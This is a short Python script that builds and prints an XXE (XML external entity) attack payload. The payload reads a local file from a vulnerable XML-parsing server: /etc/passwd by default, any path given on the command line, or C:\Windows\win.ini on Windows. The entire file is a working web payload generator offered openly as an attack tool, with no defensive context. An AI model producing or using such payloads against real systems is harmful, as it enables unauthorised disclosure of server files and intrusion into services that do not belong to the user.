#!/usr/bin/python3

import sys

def generate_xxe_payload(file_path="/etc/passwd"):
    """
    the function for generate the xxe attacks payload to read local file 
    Args:
        file_path (str): file path of local servers file 
    
    Returns:
        str: XXE payload
    """
    #  define the (ENTITY)  DOCTYPE delare
    # 'xxe' entity will read file 
    # file:// reffer the attribute 
    xxe_declaration = f"""<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>"""
    
    
    # XML body for vulnerable service
    # defined entity  '&xxe;'  to include to XML
    # server will extract if its having vulnerability
    xml_payload = f"""{xxe_declaration}
<root>
  <data>&xxe;</data>
</root>"""
    
    return xml_payload

if __name__ == "__main__":
    # get the file path from commandline argument（default /etc/passwd）
    target_file = sys.argv[1] if len(sys.argv) > 1 else "/etc/passwd"
    
    payload = generate_xxe_payload(target_file)
    
    print("--------------------------------------------------")
    print(f"[*] generated XXE payload (Target: {target_file}):")
    print("--------------------------------------------------")
    print(payload)
    print("--------------------------------------------------")
    
    if len(sys.argv) > 1:
        print("\n[i] Notice: if Windows environment tests judt then replace as C:\\Windows\\win.ini or something")
